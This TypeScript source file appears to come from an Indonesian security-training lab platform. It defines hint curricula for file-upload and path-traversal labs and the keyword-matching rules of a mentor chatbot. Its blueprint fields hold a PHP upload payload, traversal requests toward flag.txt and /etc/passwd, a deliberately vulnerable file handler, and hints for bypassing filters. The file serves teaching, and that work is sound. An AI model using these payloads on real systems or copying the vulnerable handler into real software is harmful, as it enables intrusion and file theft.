        "tacticalAction": "Kirim request upload termanipulasi di Burp Repeater dan akses URL hasilnya.",
        "codeBlueprint": "POST /api/v1/avatar/upload HTTP/1.1\nHost: 127.0.0.1:<PORT>\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryZitera\nAuthorization: Bearer <STUDENT_TOKEN>\n\n------WebKitFormBoundaryZitera\nContent-Disposition: form-data; name=\"avatar\"; filename=\"audit_probe.php\"\nContent-Type: image/png\n\n<?php echo file_get_contents(\"/opt/zitera/flag.txt\"); ?>\n------WebKitFormBoundaryZitera--"
      }
    ]
  },
  "W05": {
    "labId": "W05",
    "labTitle": "W05: Path Traversal & Local File Inclusion (LFI)",
    "tacticalRole": "Filesystem Boundary Escape & Input Path Sanitization Audit",
    "missionOverview": "Mengeksploitasi kerentanan Path Traversal / Directory Traversal dan Local File Inclusion (LFI): memanipulasi parameter file path menggunakan sekuens dot-dot-slash (../../..) untuk keluar dari direktori web root dan membaca file sensitif sistem.",
    "keywords": [
      "path traversal",
      "directory traversal",
      "lfi",
      "local file inclusion",
      "dot dot slash",
      "../",
      "..%2f",
      "passwd",
      "filesystem",
      "sanitization",
      "null byte"
    ],
    "suggestedPrompts": [
      "Bagaimana cara kerja sekuens dot-dot-slash (../../..) dalam sistem operasi Unix/Windows?",
      "Bagaimana cara mem-bypass filter naif yang menghapus string ../?",
      "Mengapa fungsi path.resolve() atau realpath() penting untuk mencegah traversal?",
      "File sistem apa saja yang paling sering dijadikan bukti keberhasilan eksploitasi Path Traversal?"
    ],
    "clues": [
      {
        "level": 1,
        "title": "Identifikasi Parameter Pembaca File Dinamis",
        "category": "Observational",
        "summary": "Cari endpoint yang menerima nama file pada parameter URL (seperti ?file=, ?page=, ?doc=).",
        "guidance": "Di lab W05, amati fitur unduh dokumen atau tampilan halaman: perhatikan URL seperti /api/documents/view?filename=report.pdf atau /view?page=about.html. Coba masukkan karakter penguji seperti filename=nonexistent.txt dan amati apakah server mengembalikan pesan error filesystem seperti ENOENT.",
        "investigativeQuestions": [
          "Apakah pesan error membocorkan struktur path absolut direktori server?",
          "Bagaimana respons server jika diberi nilai path sederhana seperti filename=../?"
        ],
        "tacticalAction": "Kirim request observasi dengan parameter file acak untuk memicu respons error path.",
        "codeBlueprint": "curl -i \"http://127.0.0.1:<PORT>/api/v1/documents/view?file=audit_probe.txt\""
      },
      {
        "level": 2,
        "title": "Kegagalan Normalisasi Path & Bypass Sanitasi Naif",
        "category": "Vulnerability Logic",
        "summary": "Pahami mengapa string replace ../ yang tidak rekursif dapat dilewati dengan mudah.",
        "guidance": "Jika developer mencoba mencegah traversal dengan cara naif: filename.replace(/\\.\\.\\//g, \"\"), penyerang cukup menggunakan sekuens bertingkat: ....//. Ketika parser menghapus ../ di tengah, sisa karakter di kiri dan kanan akan bergabung kembali membentuk ../ yang sah! Backend yang langsung menggabungkan path tanpa memvalidasi apakah path akhir masih berada di dalam direktori dasar akan membaca file sembarang.",
        "investigativeQuestions": [
          "Bagaimana cara fungsi path.resolve() dan pemeriksaan path.startsWith(baseDir) memblokir traversal?",
          "Apakah URL-encoding ganda (%252e%252e%252f) dapat mengelabui filter WAF?"
        ],
        "tacticalAction": "Periksa pola penggabungan path yang rentan terhadap sekuens traversal di bawah.",
        "codeBlueprint": "// Vulnerable Path Handler:\napp.get(\"/view\", (req, res) => {\n  const filename = req.query.file;\n  const content = fs.readFileSync(`./public/docs/${filename}`, \"utf-8\");\n  res.send(content);\n});"
      },
      {
        "level": 3,
        "title": "Cetak Biru Traversal Filesystem & Ekstraksi File Sensitif",
        "category": "Payload Blueprint",
        "summary": "Struktur request traversal berjenjang untuk membaca file konfigurasi rahasia atau flag lab.",
        "guidance": "Di Burp Suite Repeater, masukkan sekuens traversal yang cukup dalam untuk mencapai root sistem: ../../../../etc/passwd atau ../../../../opt/zitera/flag.txt. Kirimkan request dan amati responsnya: pastikan isi file sistem target berhasil terbaca di body respons HTTP.",
        "investigativeQuestions": [
          "Apakah body respons menampilkan entri user sistem operasi (seperti root:x:0:0)?",
          "Apakah token bukti ZITERA{...} ditemukan di dalam file target?"
        ],
        "tacticalAction": "Kirim request dengan parameter traversal yang disesuaikan di Burp Repeater.",
        "codeBlueprint": "GET /api/v1/documents/view?file=../../../../opt/zitera/flag.txt HTTP/1.1\nHost: 127.0.0.1:<PORT>\nAuthorization: Bearer <STUDENT_TOKEN>\nAccept: text/plain, application/json"
      }
    ]
  }
};

// ── GENERAL LAB FALLBACK CURRICULUM GENERATOR ────────────────────────────────

export function getGeneralLabFallback(labId: string, labTitle?: string): SocraticLabCurriculum {
  const cleanId = (labId || 'LAB').toUpperCase()
  const displayTitle = labTitle || `Laboratorium ${cleanId}`

  return {
    labId: cleanId,
    labTitle: displayTitle,
    tacticalRole: 'General Cyber Range Security Assessment',
    missionOverview: `Mengevaluasi kelemahan keamanan arsitektur web pada skenario ${displayTitle} menggunakan pendekatan investigasi ilmiah dan observasi multi-vektor.`,
    keywords: [
      'recon',
      'parameter',
      'endpoint',
      'authorization',
      'trust boundary',
      'payload',
      'burp',
      'curl',
      'status code',
    ],
    suggestedPrompts: [
      `Bagaimana cara memetakan parameter input pada ${cleanId}?`,
      'Di mana titik temu antara input klien dan pemrosesan server?',
      'Bagaimana cara memverifikasi apakah ada celah tanpa merusak target?',
      'Apa langkah pertama saat saya menghadapi halaman login atau form input?',
    ],
    clues: [
      {
        level: 1,
        title: 'Pemetaan Permukaan Serang & Titik Input (Reconnaissance)',
        category: 'Observational',
        summary:
          'Petakan semua parameter, URL path, header, dan input form yang berinteraksi dengan server.',
        guidance:
          'Langkah fundamental dalam audit keamanan adalah inventarisasi permukaan serang (attack surface). Buka halaman laboratorium target, lalu catat: 1) Formulir input apa saja yang tersedia? 2) Parameter query string apa saja yang muncul di URL? 3) Header atau cookie apa saja yang disertakan saat request terkirim? Selalu pahami alur kerja normal aplikasi sebelum mencoba memanipulasi apapun.',
        investigativeQuestions: [
          'Apakah ada endpoint API tersembunyi yang dipanggil di latar belakang (AJAX/Fetch)?',
          'Tipe data apa yang diharapkan oleh masing-masing field input?',
          'Bagaimana respons server terhadap input valid vs input kosong?',
        ],
        tacticalAction:
          'Jalankan inspeksi Network DevTools dan catat seluruh endpoint REST/RPC yang dipanggil.',
        codeBlueprint:
          'curl -s -D - "http://127.0.0.1:<PORT>/" -o /dev/null',
      },
      {
        level: 2,
        title: 'Analisis Logika Kepercayaan & Batas Otorisasi',
        category: 'Vulnerability Logic',
        summary:
          'Analisis asumsi pengembang dan identifikasi di mana validasi sisi server terabaikan.',
        guidance:
          'Kerentanan web timbul saat ada kesenjangan antara apa yang diasumsikan oleh pengembang dengan apa yang sebenarnya dapat dilakukan oleh klien. Tanyakan pada diri Anda: Jika pengembang berasumsi bahwa pengguna hanya boleh melihat datanya sendiri, apakah backend benar-benar memeriksa hak kepemilikan tersebut? Jika pengembang berasumsi data masukan selalu bersih, apakah ada mekanisme sanitasi atau prepared statements yang melindungi lapisan bawah?',
        investigativeQuestions: [
          'Apakah server mempercayai data yang dikirim dari klien tanpa verifikasi ulang di database?',
          'Apakah ada boundary checking yang terlewat pada validasi peran atau izin pengguna?',
          'Bagaimana perilaku server jika masukan diberi nilai ekstrem atau karakter tak terduga?',
        ],
        tacticalAction:
          'Buat skenario perbandingan: kirim request normal vs request yang dimanipulasi di Burp Repeater.',
        codeBlueprint:
          `// Pola analisis logika kontrol:
// Input Klien -> Gateway Autentikasi -> [KONTROL OTORISASI / VALIDASI?] -> Eksekusi Sumber Daya`,
      },
      {
        level: 3,
        title: 'Cetak Biru Eksploitasi & Verifikasi Tanpa Spoiler',
        category: 'Payload Blueprint',
        summary:
          'Konstruksi payload metodologis untuk membuktikan kelemahan tanpa membocorkan jawaban mentah.',
        guidance:
          'Susun request pengujian bertahap. Mulailah dari modifikasi parameter minimum untuk melihat respons error, kemudian tingkatkan ke payload pembuktian konsep (Proof of Concept). Ingat, keberhasilan audit ditandai dengan pemahaman mendalam atas mekanisme kegagalan sistem, bukan sekadar menyalin string flag.',
        investigativeQuestions: [
          'Apakah respons server mengindikasikan bahwa logika kontrol berhasil dilewati?',
          'Di bagian respons mana bukti eksekusi atau token flag tertulis?',
        ],
        tacticalAction:
          'Susun request pengujian terstruktur pada Burp Repeater atau terminal lab.',
        codeBlueprint:
          `// Cetak Biru Pengujian Standar:
METHOD /target/endpoint HTTP/1.1
Host: 127.0.0.1:<PORT>
Content-Type: application/json

{
  "test_parameter": "tampered_value"
}`,
      },
    ],
  }
}

// ── GET CURRICULUM DATA HELPER ───────────────────────────────────────────────

export function getSocraticCurriculum(labId: string, labTitle?: string): SocraticLabCurriculum {
  const cleanId = (labId || '').trim().toUpperCase()
  if (SOCRATIC_CURRICULUM_DATA[cleanId]) {
    return SOCRATIC_CURRICULUM_DATA[cleanId]
  }
  return getGeneralLabFallback(cleanId, labTitle)
}

// ── GET PAYLOAD BLUEPRINT HELPER ─────────────────────────────────────────────

export function getLabPayloadBlueprint(labId: string): LabPayloadBlueprint | undefined {
  const curriculum = getSocraticCurriculum(labId)
  const clue3 = curriculum.clues.find((c) => c.level === 3)
  if (!clue3 || !clue3.codeBlueprint) {
    return undefined
  }

  let targetParam: string | undefined
  if (curriculum.labId === 'A01' || curriculum.labId === 'W03') {
    targetParam = 'doc_id / record_id'
  } else if (curriculum.labId === 'A05') {
    targetParam = 'query / host'
  } else if (curriculum.labId === 'A10' || curriculum.labId === 'W02') {
    targetParam = 'url / webhook'
  } else if (curriculum.labId === 'W04') {
    targetParam = 'avatar / filename'
  } else if (curriculum.labId === 'W05') {
    targetParam = 'file / path'
  } else if (curriculum.labId === 'A06') {
    targetParam = 'amount / step'
  }

  return {
    title: clue3.title,
    payload: clue3.codeBlueprint,
    description: clue3.summary,
    targetParam,
  }
}

// ── INTELLIGENT KEYWORD & SOCRATIC HEURISTIC ENGINE ─────────────────────────

interface KeywordRule {
  regex: RegExp
  topic: string
  mood: ZetaMood
  responseTemplate: (prompt: string, labId: string) => string
  suggestedFollowups: string[]
}

const KEYWORD_RULES: KeywordRule[] = [
  // 1. Anti-Spoiler Guardrail (High Priority)
  {
    regex: /(apa flag|flagnya apa|bocoran flag|minta flag|give me flag|jawaban|kunci jawaban|spoiler|solusi instan|flag langsung|kasih tau flag)/i,
    topic: 'anti_spoiler_guardrail',
    mood: 'warning',
    responseTemplate: (_prompt, labId) =>
      `Operative, Protokol Integritas Siber ZITERA melarang pembocoran flag secara langsung. Sebagai Mentor Taktis Anda, tugas saya bukan memberikan ikan melainkan mengasah insting berburu Anda. Pada lab ${labId}, fokuslah pada observasi alur request. Flag akan muncul secara alami saat Anda berhasil mengeksekusi logika bypass. Mari kita telaah: parameter apa yang saat ini sedang Anda uji di Burp atau terminal?`,
    suggestedFollowups: [
      'Bagaimana cara memetakan parameter yang rentan?',
      'Apa yang harus saya periksa jika respons server tetap 403 Forbidden?',
      'Tolong beri petunjuk Level 1 (Observasi) untuk lab ini.',
    ],
  },

  // 2. IDOR / Broken Access Control
  {
    regex: /(idor|broken access|bola|horizontal privilege|vertical privilege|direct object|bypassing access|ganti id|manipulasi id)/i,
    topic: 'idor_access_control',
    mood: 'eureka',
    responseTemplate: () =>
      'IDOR (Insecure Direct Object Reference) terjadi saat server memverifikasi "siapa Anda" (autentikasi) tetapi lupa memverifikasi "apakah Anda berhak atas objek tersebut" (otorisasi). Amati parameter pengidentifikasi seperti id, doc_id, atau account_id. Jika Anda login sebagai User A, bisakah Anda mengganti ID tersebut dengan ID milik User B di Burp Repeater dan tetap menerima respons 200 OK?',
    suggestedFollowups: [
      'Bagaimana cara mengetahui nomor ID pengguna lain?',
      'Apakah IDOR bisa terjadi pada request POST dan PUT juga?',
      'Bagaimana cara remedi backend agar kebal dari serangan IDOR?',
    ],
  },

  // 3. HTTP 403 Forbidden / 401 Unauthorized
  {
    regex: /(403|forbidden|akses ditolak|401|unauthorized|tidak diizinkan|terblokir|permission denied)/i,
    topic: 'forbidden_and_authorization',
    mood: 'thinking',
    responseTemplate: () =>
      'Status 403 Forbidden menandakan server mengenali identitas Anda tetapi menolak akses ke sumber daya target, sedangkan 401 Unauthorized berarti identitas Anda belum dikenali sama sekali. Jika Anda menerima 403, tanyakan: 1) Apakah kontrol akses diperiksa berdasarkan header tertentu (seperti X-Original-URL atau X-Forwarded-For)? 2) Apakah mengubah metode HTTP (misal GET menjadi POST/PUT) mengubah status respon? 3) Apakah ada normalisasi path yang bisa di-bypass?',
    suggestedFollowups: [
      'Bagaimana cara melakukan HTTP Verb Tampering?',
      'Header apa saja yang sering disalahartikan oleh reverse proxy?',
      'Apakah cookie sesi saya masih aktif saat mengirim request?',
    ],
  },

  // 4. Headers & Protocol Tampering
  {
    regex: /(header|headers|user-agent|cookie|authorization|content-type|x-forwarded|x-requested-with)/i,
    topic: 'http_headers',
    mood: 'thinking',
    responseTemplate: () =>
      'Header HTTP adalah metadata komunikasi yang dapat dimanipulasi 100% oleh klien. Penyerang sering menyisipkan header penentu konteks jaringan seperti X-Forwarded-For: 127.0.0.1 untuk mengelabui backend agar mengira request datang dari localhost, atau memodifikasi Content-Type ke application/json untuk memicu parser backend yang berbeda. Periksa header apa saja yang diproses oleh endpoint lab saat ini.',
    suggestedFollowups: [
      'Kapan backend mempercayai header X-Forwarded-For?',
      'Bagaimana cara melihat raw request headers di Burp Suite?',
      'Apa efek manipulasi Cookie sesi terhadap kontrol akses?',
    ],
  },

  // 5. Burp Suite / Repeater / Proxy
  {
    regex: /(burp|burpsuite|repeater|proxy|intercept|tangkap request|ganti paket)/i,
    topic: 'burp_repeater_tactics',
    mood: 'idle',
    responseTemplate: () =>
      'Burp Repeater adalah laboratorium pengujian taktis Anda. Alurnya sederhana: 1) Tangkap request sah di Burp Proxy saat Anda melakukan aksi normal di browser lab. 2) Klik kanan dan pilih "Send to Repeater" (Ctrl+R). 3) Di tab Repeater, Anda bebas memodifikasi parameter, header, atau verb sesuka hati tanpa dipengaruhi oleh validasi frontend browser. Kirim dan amati perbedaan status code dan response size.',
    suggestedFollowups: [
      'Bagaimana cara membandingkan dua response di Burp Suite?',
      'Apakah saya bisa mengulang request berkali-kali tanpa logout?',
      'Bagaimana cara melihat respons dalam format Render di Burp?',
    ],
  },

  // 6. Token / JWT / Session
  {
    regex: /(token|jwt|session|bearer|cookie sesi|auth token|sessionid)/i,
    topic: 'token_and_session',
    mood: 'thinking',
    responseTemplate: () =>
      'Token sesi (seperti JWT atau session cookie) bertindak seperti paspor digital. Kunci penyelidikan: apakah token tersebut ditandatangani dengan aman di server? Apakah backend memvalidasi masa berlaku dan signature-nya? Jika token berupa JWT (terdiri dari 3 bagian yang dipisahkan titik), Anda bisa mendecode payload-nya di jwt.io atau Burp untuk melihat klaim peran pengguna (misal: role: "student").',
    suggestedFollowups: [
      'Bagaimana cara mendekode header dan payload JWT?',
      'Apakah server memvalidasi algoritma "none" pada token JWT?',
      'Apa bedanya token stateful (session cookie) dan stateless (JWT)?',
    ],
  },

  // 7. Flag Format & Capture The Flag Submission
  {
    regex: /(format flag|prefix flag|zitera\{|cara submit|di mana flag|lokasi flag)/i,
    topic: 'flag_capture_mechanics',
    mood: 'eureka',
    responseTemplate: () =>
      'Format standar flag ZITERA LAB adalah ZITERA{...}. String ini akan muncul secara eksplisit pada body respons HTTP, pesan terminal, atau halaman administrasi begitu celah keamanan berhasil dieksploitasi. Setelah menemukannya, salin seluruh teks termasuk prefix dan kurung kurawal, lalu masukkan ke panel Challenge Submission di pojok kanan bawah terminal laboratorium.',
    suggestedFollowups: [
      'Kenapa flag yang saya submit dianggap tidak valid?',
      'Apakah saya harus me-restart lab jika tidak menemukan flag?',
      'Apakah flag tiap siswa berbeda di laboratorium ZITERA?',
    ],
  },

  // 8. SQL Injection & Database
  {
    regex: /(sqli|sql injection|database|query|syntax error|union select|boolean blind|sleep)/i,
    topic: 'sql_injection',
    mood: 'thinking',
    responseTemplate: () =>
      'SQL Injection terjadi saat masukan mentah klien digabungkan langsung ke dalam string query SQL tanpa parameterisasi. Langkah investigasi: sisipkan karakter pemutus sintaks seperti tanda petik tunggal atau ganda untuk melihat apakah server memunculkan pesan kesalahan sintaks database. Jika ada error, Anda telah menemukan titik injeksi potensial.',
    suggestedFollowups: [
      'Bagaimana cara mengonfirmasi kerentanan SQLi secara aman?',
      'Apa perbedaan SQL Injection berbasis error dan blind SQLi?',
      'Mengapa prepared statement menjadi obat mujarab terhadap SQLi?',
    ],
  },

  // 9. SSRF (Server-Side Request Forgery)
  {
    regex: /(ssrf|server side request|metadata|169\.254|internal network|fetch url|webhook)/i,
    topic: 'ssrf_tactics',
    mood: 'thinking',
    responseTemplate: () =>
      'SSRF terjadi ketika server web dapat diarahkan untuk membuat request HTTP keluar ke alamat yang ditentukan penyerang. Titik serang utamanya adalah jaringan internal (seperti http://localhost, 127.0.0.1, atau endpoint cloud metadata 169.254.169.254). Periksa apakah ada parameter yang menerima nilai URL seperti `url=`, `webhook=`, atau `callback=`.',
    suggestedFollowups: [
      'Apa yang bisa didapatkan penyerang jika berhasil melakukan SSRF ke localhost?',
      'Bagaimana cara mem-bypass filter alamat 127.0.0.1?',
      'Apakah SSRF bisa digunakan untuk memindai port internal?',
    ],
  },

  // 10. Stuck / Bingung / Bantuan Umum
  {
    regex: /(stuck|bingung|buntu|tolong|help|nggak tau|pusing|harus gimana|langkah awal|lost)/i,
    topic: 'diagnostic_guidance',
    mood: 'idle',
    responseTemplate: (_prompt, labId) =>
      `Tarik napas, Operative. Kebuntuan adalah bagian alami dari proses investigasi siber. Untuk lab ${labId}, mari kita jalankan 3 langkah diagnostik taktis: 1) Buka Clue Level 1 (Observasi) di atas untuk melihat parameter mana yang harus diperhatikan. 2) Buka DevTools Network tab dan perhatikan request yang dikirim saat Anda mengklik menu utama. 3) Apakah ada respon yang mencurigakan atau mengandung nomor ID?`,
    suggestedFollowups: [
      'Buka Clue Level 1: Parameter apa yang harus saya cek?',
      'Buka Clue Level 2: Mengapa sistem ini rentan?',
      'Bagaimana cara mengatur Burp Suite agar terhubung ke browser lab?',
    ],
  },
]

// ── SOCRATIC ENGINE QUERY DISPATCHER ────────────────────────────────────────

export function querySocraticEngine(prompt: string, labId: string): SocraticResponse {
  const cleanPrompt = (prompt || '').trim()
  const cleanLabId = (labId || 'F01').trim().toUpperCase()

  if (!cleanPrompt) {
    return {
      message:
        'Sistem Mentor ZETA siap. Ketik pertanyaan investigasi, analisis celah, atau minta panduan taktis seputar laboratorium ini. Saya akan membimbing Anda langkah demi langkah tanpa merusak keseruan tantangan.',
      mood: 'idle',
      suggestedFollowups: [
        'Apa langkah observasi awal untuk lab ini?',
        'Bagaimana cara kerja kontrol akses di sini?',
        'Parameter apa yang patut dicurigai?',
      ],
    }
  }

  // 1. Evaluate Rule Matchers
  for (const rule of KEYWORD_RULES) {
    if (rule.regex.test(cleanPrompt)) {
      const isAntiSpoiler = rule.topic === 'anti_spoiler_guardrail'
      return {
        message: rule.responseTemplate(cleanPrompt, cleanLabId),
        mood: rule.mood,
        matchedTopic: rule.topic,
        suggestedFollowups: rule.suggestedFollowups,
        antiSpoilerWarning: isAntiSpoiler,
      }
    }
  }

  // 2. Lab-Specific Fallback if no global keyword matches
  const labCurriculum = getSocraticCurriculum(cleanLabId)
  const isLabKeyword = labCurriculum.keywords.some((kw) =>
    cleanPrompt.toLowerCase().includes(kw.toLowerCase()),
  )

  if (isLabKeyword) {
    return {
      message: `Pertanyaan Anda menyentuh aspek inti dari ${labCurriculum.labTitle}. Dalam laboratorium ini, misi Anda adalah ${labCurriculum.missionOverview} Cobalah buka Clue Level 1 atau Level 2 di accordion atas untuk membedah titik kerentanan ini secara terstruktur.`,
      mood: 'eureka',
      matchedTopic: cleanLabId,
      suggestedFollowups: labCurriculum.suggestedPrompts.slice(0, 3),
    }
  }

  // 3. General Socratic Pacing Fallback
  return {
    message: `Pertanyaan menarik, Operative. Untuk memecahkan teka-teki pada ${labCurriculum.labTitle}, coba rumuskan hipotesis Anda: menurut Anda, bagian mana dari arsitektur target yang memiliki asumsi keliru tentang input klien? Anda juga dapat membuka petunjuk bertahap (Clue Level 1 hingga 3) di panel atas untuk mempersempit ruang pencarian.`,
    mood: 'thinking',
    suggestedFollowups: [
      'Buka Clue Level 1 untuk observasi awal.',
      'Bagaimana cara membedah header HTTP target?',
      'Di mana saya bisa melihat contoh pola request?',
    ],
  }
}
